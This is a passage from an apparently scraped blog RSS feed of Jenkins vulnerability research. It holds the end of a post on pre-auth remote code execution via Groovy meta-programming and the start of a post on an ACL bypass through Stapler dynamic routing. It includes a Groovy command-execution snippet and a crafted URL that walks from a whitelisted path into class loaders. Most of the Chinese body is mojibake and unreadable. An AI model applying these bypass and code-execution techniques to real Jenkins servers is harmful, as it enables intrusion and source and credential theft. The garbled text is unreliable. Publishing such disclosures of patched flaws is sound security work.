&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;) on Jenkins to protect the Pipeline, itâ€™s useless because the vulnerability is in compile-time, not in run-time!&lt;/p&gt;

&lt;p&gt;Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developerâ€™s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! Thatâ€™s what makes this vulnerability interesting. Aside from entry points &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; I reported, after the vulnerability has been fixed, &lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; also found another &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;entry point&lt;/a&gt; quickly to trigger this vulnerability!&lt;/p&gt;

&lt;p&gt;Apart from that, this vulnerability can also be chained with my previous exploit on &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P&lt;/p&gt;

&lt;p&gt;Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨è»Ÿé«”å·¥ç¨‹ä¸­, &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; åŠ &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; ä¸€ç›´éƒ½è¢«è­½ç‚ºæ˜¯è»Ÿé«”é–‹ç™¼ä¸Šçš„å¿…å‚™æµç¨‹, æœ‰å¤šå°‘å„ªé»å°±ä¸å¤šè«‡, å…‰æ˜¯å¹«åŠ©é–‹ç™¼è€…æ¸›å°‘è¨±å¤šé›œäº‹å°±æ˜¯å¾ˆå¤§çš„å„ªå‹¢äº†! è€Œåœ¨ CI/CD çš„é ˜åŸŸä¸­, Jenkins æ˜¯æœ€ç‚ºè€ç‰Œä¸”å»£ç‚ºäººçŸ¥çš„ä¸€å¥—å·¥å…·, ç”±æ–¼å®ƒçš„æ˜“ç”¨æ€§, å¼·å¤§çš„ Pipeline ç³»çµ±ä»¥åŠå°æ–¼å®¹å™¨å®Œç¾çš„æ•´åˆä½¿å¾— Jenkins ä¹Ÿæˆç‚ºç›®å‰æœ€å¤šäººä½¿ç”¨çš„ CI/CD æ‡‰ç”¨, æ ¹æ“š Snyk åœ¨ 2018 å¹´æ‰€åšå‡ºçš„ &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM ç”Ÿæ…‹å ±å‘Š&lt;/a&gt; ä¸­, Jenkins åœ¨ CI/CD æ‡‰ç”¨ä¸­ç´„ä½”å…­æˆçš„å¸‚ä½”ç‡!&lt;/p&gt;

&lt;p&gt;å°æ–¼ &lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;ç´…éšŠæ¼”ç·´(Red Team)&lt;/a&gt; ä¾†èªª, Jenkins æ›´æ˜¯å…µå®¶å¿…çˆ­ä¹‹åœ°, åªè¦èƒ½æŒæ¡ä¼æ¥­æš´éœ²åœ¨å¤–çš„ Jenkins å³å¯æŒæ¡å¤§é‡çš„åŸå§‹ç¢¼, ç™»å…¥æ†‘è­‰ç”šè‡³æ§åˆ¶å¤§é‡çš„ Jenkins ç¯€é»! åœ¨éå» DEVCORE æ‰€ç¶“æ‰‹éçš„æ»²é€æ¡ˆå­ä¸­ä¹Ÿå‡ºç¾éæ•¸æ¬¡ç”± Jenkins ç•¶æˆé€²å…¥é», ä¸€æ­¥ä¸€æ­¥å¾ä¸€å€‹å°è£‚ç¸«å°‡ç›®æ¨™æ’•é–‹åˆ°å®Œæ•´æ»²é€æ•´é–“å…¬å¸çš„ç¶“å…¸æ¡ˆä¾‹!&lt;/p&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç« ä¸»è¦æ˜¯åˆ†äº«å»å¹´ä¸­é‡å° Jenkins æ‰€åšçš„ä¸€æ¬¡ç°¡å–® Security Review, éç¨‹ä¸­å…±ç™¼ç¾äº†äº”å€‹ CVE:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶ä¸­æ¯”è¼ƒè¢«å¤§å®¶æ‰€è¨è«–çš„æ‡‰è©²æ˜¯ CVE-2018-1999002, é€™æ˜¯ä¸€å€‹åœ¨ Windows ä¸‹çš„ä»»æ„æª”æ¡ˆè®€å–, ç”±æ–¼æ”»æ“Šæ–¹å¼ç¨å¾®æœ‰è¶£æ‰€ä»¥è¨è«–è²é‡è¼ƒé«˜ä¸€é», é€™å€‹å¼±é»åœ¨å¤–é‚Šä¹Ÿæœ‰äººåšäº†è©³ç´°çš„åˆ†æ, è©³æƒ…å¯ä»¥åƒè€ƒç”±é¨°è¨Šé›²é¼å¯¦é©—å®¤æ‰€åšçš„åˆ†æ(&lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;Jenkins ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ&lt;/a&gt;), ä»–å€‘ä¹ŸæˆåŠŸçš„å±•ç¤ºå¾ &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; æ‰¾åˆ°ä¸€å°æœªä¿®è£œçš„ Jenkins å¯¦ç¾ä»»æ„è®€æª”åˆ°é ç«¯ä»£ç¢¼åŸ·è¡Œå–å¾—æ¬Šé™çš„éç¨‹!&lt;/p&gt;

&lt;p&gt;ä½†é€™ç¯‡æ–‡ç« è¦æçš„ä¸¦ä¸æ˜¯é€™å€‹, è€Œæ˜¯ç•¶æ™‚ç‚ºäº†å˜—è©¦ç¹é CVE-2018-1999002 æ‰€éœ€çš„æœ€å°æ¬Šé™ Overall/Read æ™‚è·Ÿé€² Jenkins æ‰€ä½¿ç”¨çš„æ ¸å¿ƒæ¡†æ¶ Stapler æŒ–æ˜æ‰€ç™¼ç¾çš„å¦å¤–ä¸€å€‹å•é¡Œ - CVE-2018-1000861! å¦‚æœå…‰å¾å®˜æ–¹çš„æ¼æ´æ•˜è¿°æ‡‰è©²æœƒè¦ºå¾—å¾ˆç¥å¥‡, çœŸçš„å¯ä»¥å…‰å¾éš¨ä¾¿ä¸€å€‹ç¶²å€å»é”æˆä»£ç¢¼åŸ·è¡Œå—?&lt;/p&gt;

&lt;p&gt;é‡å°é€™å€‹æ¼æ´, æˆ‘çš„è§€é»æ˜¯å®ƒå°±æ˜¯ä¸€å€‹å­˜å–æ§åˆ¶æ¸…å–®(ACL)ä¸Šçš„ç¹é, ä½†ç”±æ–¼é€™æ˜¯ Jenkins æ¶æ§‹ä¸Šçš„å•é¡Œä¸¦ä¸æ˜¯å–®ä¸€çš„ç¨‹å¼ç·¨å¯«å¤±èª¤, é€²è€Œå°è‡´äº†é€™å€‹æ¼æ´åˆ©ç”¨ä¸Šçš„å¤šæ¨£æ€§! è€Œç‚ºäº†é€™å€‹æŠ€è¡“å‚µ, Jenkins å®˜æ–¹ä¹ŸèŠ±è²»äº†ä¸€ç•ªå¿ƒåŠ›(&lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins Patch&lt;/a&gt; åŠ &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler Patch&lt;/a&gt;)å»ä¿®å¾©é€™å€‹æ¼æ´, ä¸ä½†åœ¨åŸæœ‰çš„æ¶æ§‹ä¸Šä»‹ç´¹äº†æ–°çš„è·¯ç”±é»‘åå–®åŠç™½åå–®, ä¹Ÿæ“´å±•äº†åŸæœ‰æ¶æ§‹çš„ &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; å»ä¿è­· Jenkins è·¯ç”±, ä¸‹é¢å°±ä¾†è§£é‡‹ç‚ºä½• Jenkins è¦èŠ±äº†é‚£éº¼å¤šå¿ƒåŠ›å»ä¿®å¾©é€™å€‹æ¼æ´!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ä»£ç¢¼å¯©æŸ¥ç¯„åœ&quot;&gt;ä»£ç¢¼å¯©æŸ¥ç¯„åœ&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;é¦–å…ˆè¦è²æ˜çš„æ˜¯, é€™ä¸¦ä¸æ˜¯ä¸€æ¬¡å®Œæ•´çš„ä»£ç¢¼å¯©æŸ¥(ç•¢ç«Ÿè¦åšä¸€æ¬¡å¤ªèŠ±æ™‚é–“äº†â€¦), å› æ­¤åªé‡å°é«˜é¢¨éšªæ¼æ´é€²è¡ŒæŒ–æ˜, è‘—çœ¼çš„ç¯„åœåŒ…æ‹¬:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins æ ¸å¿ƒ&lt;/li&gt;
  &lt;li&gt;Stapler ç¶²é æ¡†æ¶&lt;/li&gt;
  &lt;li&gt;å»ºè­°å®‰è£æ’ä»¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jenkins åœ¨å®‰è£éç¨‹ä¸­æœƒè©¢å•æ˜¯å¦å®‰è£å»ºè­°çš„å¥—ä»¶(åƒæ˜¯ Git, GitHub, SVN èˆ‡ Pipelineâ€¦ ç­‰ç­‰), åŸºæœ¬ä¸Šå¤§å¤šæ•¸äººéƒ½æœƒåŒæ„ä¸ç„¶å°±åªæœƒå¾—åˆ°ä¸€å€‹åŠæ®˜çš„ Jenkins å¾ˆä¸æ–¹ä¾¿XD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;jenkins-ä¸­çš„æ¬Šé™æ©Ÿåˆ¶&quot;&gt;Jenkins ä¸­çš„æ¬Šé™æ©Ÿåˆ¶&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;å› ç‚ºé€™æ˜¯ä¸€å€‹åŸºæ–¼ ACL ä¸Šçš„ç¹é, æ‰€ä»¥åœ¨è§£é‡‹æ¼æ´ä¹‹å‰, å…ˆä¾†ä»‹ç´¹ä¸€ä¸‹ Jenkins ä¸­çš„æ¬Šé™æ©Ÿåˆ¶! åœ¨ Jenkins ä¸­æœ‰æ•¸ç¨®ä¸åŒçš„è§’è‰²æ¬Šé™, ç”šè‡³æœ‰å°ˆé–€çš„ &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt; (åŒç‚ºå»ºè­°å®‰è£å¥—ä»¶)å¯é‡å°å„å°ˆæ¡ˆé€²è¡Œç´°éƒ¨çš„æ¬Šé™è¨­å®š, å¾æ”»æ“Šè€…çš„è§’åº¦æˆ‘å€‘ç²—ç•¥åˆ†æˆä¸‰ç¨®:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;
&lt;p&gt;å°æ–¼ Jenkins æœ‰å®Œæ•´çš„æ§åˆ¶æ¬Š, å¯å° Jenkins åšä»»ä½•äº‹! åŸºæœ¬ä¸Šæœ‰é€™å€‹æ¬Šé™å³å¯é€é &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; ä»‹é¢ä½¿ç”¨ Groovy åŸ·è¡Œä»»æ„ä»£ç¢¼!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹æ¬Šé™å°æ–¼é§­å®¢ä¾†èªªä¹Ÿæ˜¯æœ€æ¸´æœ›å¾—åˆ°çš„æ¬Šé™, ä½†åŸºæœ¬ä¸Šç”±æ–¼å®‰å…¨æ„è­˜çš„æå‡åŠç¶²è·¯ä¸Šå„ç¨®æ®­å±ç¶²è·¯å°å…¨ç¶²é€²è¡Œæƒæ, é€™ç¨®é…ç½®å·²ç¶“å¾ˆå°‘è¦‹(æˆ–åªè¦‹æ–¼å…§ç¶²)&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;å¯å¾ &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; ä»‹é¢ä¸­å‹¾é¸ä¸‹é¢é¸é …ä¾†é–‹å•Ÿé€™å€‹æ¨¡å¼&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨é€™å€‹æ¨¡å¼ä¸‹, æ‰€æœ‰çš„å…§å®¹çš†æ˜¯å¯è®€çš„, ä¾‹å¦‚å¯çœ‹åˆ°å·¥ä½œæ—¥èªŒæˆ–æ˜¯ä¸€äº› job/node ç­‰æ•æ„Ÿè³‡è¨Š, å°æ–¼æ”»æ“Šè€…ä¾†èªªåœ¨é€™å€‹æ¨¡å¼ä¸‹æœ€å¤§çš„å¥½è™•å°±æ˜¯å¯ä»¥ç²å¾—å¤§é‡çš„åŸå§‹ç¢¼! ä½†èˆ‡ Full Access æ¨¡å¼æœ€å¤§çš„å·®ç•°å‰‡æ˜¯ç„¡æ³•é€²è¡Œæ›´é€²ä¸€æ­¥çš„æ“ä½œæˆ–æ˜¯åŸ·è¡Œ Groovy ä»£ç¢¼ä»¥å–å¾—æ§åˆ¶æ¬Š!&lt;/p&gt;

&lt;p&gt;é›–ç„¶é€™ä¸æ˜¯ Jenkins çš„é è¨­è¨­å®š, ä½†å°æ–¼ä¸€äº›ç¿’æ…£è‡ªå‹•åŒ–çš„ DevOps ä¾†èªªé‚„æ˜¯æœ‰å¯èƒ½é–‹å•Ÿé€™å€‹é¸é …, æ ¹æ“šå¯¦éš›åœ¨ &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; ä¸Šçš„èª¿æŸ¥ç´„ 12% çš„æ©Ÿå™¨é‚„æ˜¯é–‹å•Ÿé€™å€‹é¸é …! ä»¥ä¸‹ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; ä¾†ä»£ç¨±é€™å€‹æ¨¡å¼&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯ Jenkins é è¨­å®‰è£å¥½çš„è¨­å®š, åœ¨æ²’æœ‰ä¸€çµ„æœ‰æ•ˆçš„å¸³è™Ÿå¯†ç¢¼ç‹€æ³ä¸‹ç„¡æ³•çœ‹åˆ°ä»»ä½•è³‡è¨ŠåŠé€²è¡Œä»»ä½•æ“ä½œ! ä»¥ä¸‹ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; ä¾†ä»£ç¨±æ­¤æ¨¡å¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;æ•´å€‹æ¼æ´è¦å¾ Jenkins çš„ &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;å‹•æ…‹è·¯ç”±&lt;/a&gt; è¬›èµ·, ç‚ºäº†çµ¦é–‹ç™¼è€…æ›´å¤§çš„å½ˆæ€§, Jenkins(åš´æ ¼ä¾†è¬›æ˜¯ Stapler)ä½¿ç”¨äº†ä¸€å¥— Naming Convention å»åŒ¹é…è·¯ç”±åŠå‹•æ…‹çš„åŸ·è¡Œ! é¦–å…ˆ Jenkins ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; ç‚ºåˆ†éš”å°‡ URL ç¬¦è™ŸåŒ–, æ¥è‘—ç”± &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; ç‚ºå…¥å£é»é–‹å§‹å¾€ä¸‹æœå°‹, å¦‚æœç¬¦è™Ÿç¬¦åˆ (1) Public å±¬æ€§çš„æˆå“¡æˆ–æ˜¯ (2) Public å±¬æ€§çš„æ–¹æ³•ç¬¦åˆä¸‹åˆ—å‘½åè¦å‰‡, å‰‡èª¿ç”¨ä¸¦ç¹¼çºŒå¾€ä¸‹å‘¼å«:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, â€¦)&lt;/li&gt;
    &lt;li&gt;doDynamic(â€¦)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(â€¦)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(â€¦)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;çœ‹èµ·ä¾† Jenkins çµ¦äºˆé–‹ç™¼è€…å¾ˆå¤§ç¨‹åº¦çš„è‡ªç”±å»è¨ªå•å„å€‹ç‰©ä»¶, ä½†éæ–¼è‡ªç”±ç¸½æ˜¯ä¸å¥½çš„ï¼Œæ ¹æ“šé€™ç¨®èª¿ç”¨æ–¹å¼é€™è£¡å°±å‡ºç¾äº†å…©å€‹å•é¡Œ!&lt;/p&gt;

&lt;h3 id=&quot;1-è¬ç‰©çš†ç¹¼æ‰¿-javalangobject&quot;&gt;1. è¬ç‰©çš†ç¹¼æ‰¿ java.lang.Object&lt;/h3&gt;
&lt;p&gt;åœ¨ Java ä¸­, æ‰€æœ‰çš„ç‰©ä»¶çš†ç¹¼æ‰¿ &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt; é€™å€‹é¡åˆ¥, å› æ­¤æ‰€æœ‰åœ¨ Java ä¸­çš„ç‰©ä»¶çš†å­˜åœ¨è‘— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; é€™å€‹æ–¹æ³•! è€Œæ°å·§é€™å€‹æ–¹æ³•åˆç¬¦åˆå‘½åè¦å‰‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#1&lt;/code&gt;, å› æ­¤ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; å¯åœ¨ Jenkins èª¿ç”¨éˆä¸­è¢«å‹•æ…‹å‘¼å«!&lt;/p&gt;

&lt;h3 id=&quot;2-è·¨ç‰©ä»¶æ“ä½œå°è‡´ç™½åå–®ç¹é&quot;&gt;2. è·¨ç‰©ä»¶æ“ä½œå°è‡´ç™½åå–®ç¹é&lt;/h3&gt;

&lt;p&gt;å‰é¢æ‰€æåˆ°çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ&lt;/code&gt;, å…¶ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;True&lt;/code&gt; èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; é–“æœ€å¤§çš„ä¸åŒåœ¨æ–¼ç•¶åœ¨ç¦æ­¢çš„ç‹€æ³ä¸‹, æœ€åˆçš„å…¥å£é»æœƒé€é &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt; å¤šåšä¸€å€‹åŸºæ–¼ç™½åå–®çš„ URL å‰ç¶´æª¢æŸ¥, é€™å€‹ç™½åå–®å¦‚ä¸‹:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™ä¹Ÿä»£è¡¨è‘—ä¸€é–‹å§‹å¯é¸çš„å…¥å£é™åˆ¶æ›´åš´æ ¼é¸æ“‡æ›´å°‘, ä½†å¦‚æœèƒ½åœ¨ä¸€å€‹ç™½åå–®ä¸Šçš„å…¥å£æ‰¾åˆ°å…¶ä»–ç‰©ä»¶åƒè€ƒ, è·³åˆ°éç™½åå–®ä¸Šçš„æˆå“¡è±ˆä¸å¯ä»¥ç¹éå‰è¿°çš„ URL å‰ç¶´é™åˆ¶? å¯èƒ½æœ‰é»é›£ç†è§£, é€™è£¡å…ˆä¾†ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ä¾†è§£é‡‹ Jenkins çš„å‹•æ…‹è·¯ç”±æ©Ÿåˆ¶:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä»¥ä¸Šç¶²å€æœƒä¾åºåŸ·è¡Œä¸‹åˆ—æ–¹æ³•&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
